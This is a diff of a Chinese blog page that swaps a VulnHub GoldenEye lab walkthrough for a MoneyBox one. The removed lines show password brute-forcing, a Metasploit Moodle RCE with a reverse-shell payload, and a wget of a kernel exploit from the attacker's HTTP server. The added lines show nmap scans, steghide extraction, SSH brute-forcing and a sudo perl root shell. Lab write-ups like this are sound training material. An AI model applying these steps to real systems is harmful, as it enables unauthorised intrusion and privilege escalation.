@@ -3,7 +3,7 @@
 <html lang="zh-Hans">
     <head>
         <meta charset="utf-8" />
-        <title>GoldenEye靶机学习 | 小C♥天天</title>
+        <title>MoneyBox靶机学习 | 小C♥天天</title>
         <meta name="author" content="小C&天天" />
         <meta name="description" content="^v^" />
         <meta name="keywords" content="" />
@@ -192,7 +192,7 @@
                 <div id="article-posts-wrap" true ref="homePostsWrap">
     <div class="article">
         <div>
-            <h1>GoldenEye靶机学习</h1>
+            <h1>MoneyBox靶机学习</h1>
         </div>
         <div class="info">
             <span class="date">
@@ -220,7 +220,12 @@
                 
                 <span class="tag">
                     
-                    <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="color: #00bcd4">靶机</a>
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="color: #00a596">靶机</a>
+                </span>
+                
+                <span class="tag">
+                    
+                    <a href="/tags/vulnhub/" style="color: #00bcd4">vulnhub</a>
                 </span>
                 
             </span>
@@ -228,97 +233,46 @@
         </div>
         
         <div class="content" v-pre>
-            <h1 id="壹-题目信息"><a href="#壹-题目信息" class="headerlink" title="壹 题目信息"></a>壹 题目信息</h1><p>名字：<code>GoldenEye</code><br>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/">传送门</a><br>靶机<code>IP</code>：<code>192.168.239.147</code></p>
+            <h1 id="壹-题目信息"><a href="#壹-题目信息" class="headerlink" title="壹 题目信息"></a>壹 题目信息</h1><p>名字：<code>MoneyBox</code><br>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/moneybox-1,653/">传送门</a><br>靶机<code>IP</code>：<code>192.168.239.146</code></p>
 <span id="more"></span>
 
-<h1 id="贰-解题"><a href="#贰-解题" class="headerlink" title="贰 解题"></a>贰 解题</h1><p>端口扫描：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102155627827.png" alt="image-20221102155627827"></p>
-<p>存在25，80，110，55006，55007端口开放，接着从80入手，访问：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102142450683.png" alt="image-20221102142450683"></p>
-<p>存在两个问题：<code>terminal.js</code>和<code>/sev-home/</code>，分别访问发现<code>http://192.168.239.147/terminal.js</code>存在密码泄露，<code>http://192.168.239.147/sev-home/</code>需要登录：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154111611.png" alt="image-20221102154111611"></p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154121736.png" alt="image-20221102154121736"></p>
-<p><code>http://192.168.239.147/terminal.js</code>存在密码泄露，即将<code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code>进行<code>HTML</code>编码，获得密码为：<code>InvincibleHack3r</code>，并且根据提示发现用户名为<code>Boris</code>，由于外国人的名字首字母大写，所以原来的用户名应该是<code>boris</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154254581.png" alt="image-20221102154254581"></p>
-<p>登陆后，查看前端信息发现，包含两个管理员<code>Natalya</code>、<code>Boris</code>，在根据网页里面的提示打开了<code>pop3</code>，回想起前面的两个高端口：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154826225.png" alt="image-20221102154826225"></p>
-<p>通过<code>telnet</code>访问两个端口发现<code>55007</code>存在<code>pop3</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102160323341.png" alt="image-20221102160323341"></p>
-<p>尝试登录，发现前面的用户名密码已经用不了：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102160939766.png" alt="image-20221102160939766"></p>
-<p>开始尝试爆破，根据前面的两个用户名生成四个用户名<code>Natalya</code>、<code>natalya</code>、<code>Boris</code>、<code>boris</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102163405682.png" alt="image-20221102163405682"></p>
-<pre><code class="bash">[55007][pop3] host: 192.168.239.147   login: Natalya   password: bird
-[55007][pop3] host: 192.168.239.147   login: natalya   password: bird
-[55007][pop3] host: 192.168.239.147   login: Boris   password: secret1!
-[55007][pop3] host: 192.168.239.147   login: boris   password: secret1!
+<h1 id="贰-解题"><a href="#贰-解题" class="headerlink" title="贰 解题"></a>贰 解题</h1><p>直接扫描端口服务：</p>
+<pre><code class="bash">nmap -sn 192.168.239.1/24
+nmap -sS -p 1-65535 -v 192.168.239.146
 </code></pre>
-<p><code>Natalya</code>和<code>natalya</code>，<code>Boris</code>和<code>boris</code>属于同一账户，邮件内容一样，登录<code>natalya</code>邮箱进行查看：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102163815629.png" alt="image-20221102163815629"></p>
-<p>查看两封邮件发现，存在一个用户名密码以及一个域名以及<code>/etc/hosts</code>：</p>
-<pre><code class="bash">域名：severnaya-station.com/gnocertdir
-用户名密码：
-username: xenia
-password: RCP90rulez!
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102112147750.png" alt="image-20221102112147750"></p>
+<p>存在web和ftp服务，首先尝试从web突破：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102112605119.png" alt="image-20221102112605119"></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102112643971.png" alt="image-20221102112643971"></p>
+<p>访问<code>http://192.168.239.146/blogs/</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102112715539.png" alt="image-20221102112715539"></p>
+<p>在前端源代码中，发现问题<code>the hint is the another secret directory is S3cr3t-T3xt</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102112901611.png" alt="image-20221102112901611"></p>
+<p>根据线索继续搜索，发现<code>..Secret Key 3xtr4ctd4t4 </code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102113021774.png" alt="image-20221102113021774"></p>
+<p>此时发现已经没有任何利用价值了，尝试ftp，发现能匿名访问，发现一张图片，先下载下来：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102130910898.png" alt="image-20221102130910898"></p>
+<p>使用steghide查看图片隐藏的内容，需要密码，即前面获取到的<code>3xtr4ctd4t4</code>，得到一个data：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102131631584.png" alt="image-20221102131631584"></p>
+<p>获得用户名：<code>renu</code>，并且文本提示弱口令，尝试爆破<code>ssh</code>：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102131913203.png" alt="image-20221102131913203"></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102132112291.png" alt="image-20221102132112291"></p>
+<p>获得<code>renu\987654321</code>，登录获得第一个<code>flag1</code>：<code>us3r1&#123;F14g:0ku74tbd3777y4&#125;</code></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102132520897.png" alt="image-20221102132520897"></p>
+<p>尝试提权，没有可以利用的，但是发现了一个<code>lily</code>用户，并且获取到了<code>flag2</code>：<code>us3r&#123;F14g:tr5827r5wu6nklao&#125;</code></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102133944297.png" alt="image-20221102133944297"></p>
+<p>同时还发现可以使用<code>renu</code>免密登录：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102133831169.png" alt="image-20221102133831169"></p>
+<p>查看用户权限：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102140333355.png" alt="image-20221102140333355"></p>
+<p>发现能用<code>perl</code>，那就用<code>perl</code>提权：</p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102140833843.png" alt="image-20221102140833843"></p>
+<pre><code class="bash">sudo perl -e &#39;exec &quot;/bin/sh&quot;;&#39;
 </code></pre>
-<p>登录<code>boris</code>邮箱进行查看：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102164948278.png" alt="image-20221102164948278"></p>
-<p>提示了有一份文件使用<code>GoldenEye</code>作为访问代码作为附件发送，并且放在此服务器的根目录下隐藏文件，但此处无法查看到附件内容，不过我们可以根据<code>natalya</code>邮箱，设置<code>hosts</code>文件，访问：<code>http://severnaya-station.com/gnocertdir/</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102172938877.png" alt="image-20221102172938877"></p>
-<p>可以发现是一个<code>moodle</code>开源<code>cms</code>系统，简单翻阅一下，发现存在登录，尝试前面的用户名密码：<code>xenia\RCP90rulez!</code>，登陆成功：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102173510358.png" alt="image-20221102173510358"></p>
-<p>接着又是翻阅，发现一个用户<code>doak</code>，是邮箱，我们接着对其进行爆破，发现也是弱口令<code>doak\goat</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174232773.png" alt="image-20221102174232773"></p>
-<p>登录查看邮箱，存在一个邮件：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174215718.png" alt="image-20221102174215718"></p>
-<p>查看邮件又获得一个用户名密码<code>dr_doak\4England!</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174406771.png" alt="image-20221102174406771"></p>
-<p>登录该用户，获得一个文件：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174737238.png" alt="image-20221102174737238"></p>
-<p>下载下来了，查看，说在这个目录<code>/dir007key/for-007.jpg</code>有一个图片，可能包含<code>adm1n</code>的信息：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174915901.png" alt="image-20221102174915901"></p>
-<p>访问<code>http://severnaya-station.com/dir007key/for-007.jpg</code>，下载下来：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102175220107.png" alt="image-20221102175220107"></p>
-<p>对图片进行一遍操作，发现使用<code>exiftool for-007.jpg</code>执行发现有<code>base64</code>编码：<code>eFdpbnRlcjE5OTV4IQ==</code>，必有猫腻，解码为<code>xWinter1995x!</code>，猜测会不会是前面<code>admin</code>的密码：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102175732861.png" alt="image-20221102175732861"></p>
-<p>尝试后发现是<code>admin</code>，登录后，查看有没有有用的信息，可以看到是<code>moodle</code>版本为<code>2.2.3</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102182325429.png" alt="image-20221102182325429"></p>
-<p>在网上查找对应版本的漏洞，发现为有<code>CVE-2013-3630</code>，尝试使用<code>msf</code>进行攻击：</p>
-<pre><code class="bash">search CVE-2013-3630
-use exploit/multi/http/moodle_spelling_binary_rce
-set username admin
-set password xWinter1995x!
-set rhosts severnaya-station.com
-set targeturi /gnocertdir
-set payload cmd/unix/reverse
-set lhost 192.168.239.142
-options
-</code></pre>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105224206276.png" alt="image-20221105224206276"></p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105224309860.png" alt="image-20221105224309860"></p>
-<p>注意这时候还不可以利用，因为<code>msf</code>的底层代码使用的是<code>pspellshell</code>，网页使用的是<code>Googleshell</code>，导致没有办法去运行，所以在网页的<code>TinyMCE HTML editor</code>处选择<code>pspellshell</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105224656259.png" alt="image-20221105224656259"></p>
-<p>然后利用：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105225020421.png" alt="image-20221105225020421"></p>
-<p>利用后获得的是一个伪<code>shell</code>，所以我们可以使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; </code>获得一个交互的<code>shell</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105225348124.png" alt="image-20221105225348124"></p>
-<p>查看系统信息，发现内核版本<code>Linux ubuntu 3.13.0-32</code>，存在<code>CVE-2015-1328</code>提取漏洞，<code>kali</code>里有<code>CVE-2015-1328</code>攻击脚本：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105230236330.png" alt="image-20221105230236330"></p>
-<pre><code class="bash">searchsploit 37292
-cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/桌面/
-// 由于靶场无法进行gcc编译，需要改成cc，即编辑脚本37292.c，将第143行的gcc改成cc
-</code></pre>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105230458058.png" alt="image-20221105230458058"></p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105230116214.png" alt="image-20221105230116214"></p>
-<p>然后在存在<code>exp</code>的目录下开<code>http</code>服务：<code>python2 -m SimpleHTTPServer 8888</code>，接着在<code>msf</code>获得的靶机终端，执行<code>wget http://10.10.10.129:8888/37292.c</code>，并编译<code>cc -o exp 37292.c </code>，最后执行<code>exp</code>，在<code>/root</code>目录下的<code>.flag.txt</code>获得<code>flag</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231013332.png" alt="image-20221105231013332"></p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231409418.png" alt="image-20221105231409418"></p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231701284.png" alt="image-20221105231701284"></p>
-<p>根据提示访问<code>http://severnaya-station.com/006-final/xvf7-flag/</code>：</p>
-<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231939196.png" alt="image-20221105231939196"></p>
+<p><img src="/images/%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/MoneyBox%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102140724445.png" alt="image-20221102140724445"></p>
+<p>获得<code>flag3</code>：<code>r00t&#123;H4ckth3p14n3t&#125;</code></p>
 <h1 id="叁-需要学习的知识"><a href="#叁-需要学习的知识" class="headerlink" title="叁 需要学习的知识"></a>叁 需要学习的知识</h1><ul>
-<li><code>pop</code>服务访问</li>
-<li><code>Linux</code>提权：<code>CVE-2015-1328</code></li>
+<li><code>perl</code>提权</li>
 </ul>
 
         </div>
@@ -488,7 +442,7 @@ cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/桌面/
         <script>
             var v = new Viewer({
                 basePath: "/model",
-                role: "heitaizi_2",
+                role: "deyizhi_3",
                 mobile: true,
             });
         </script>
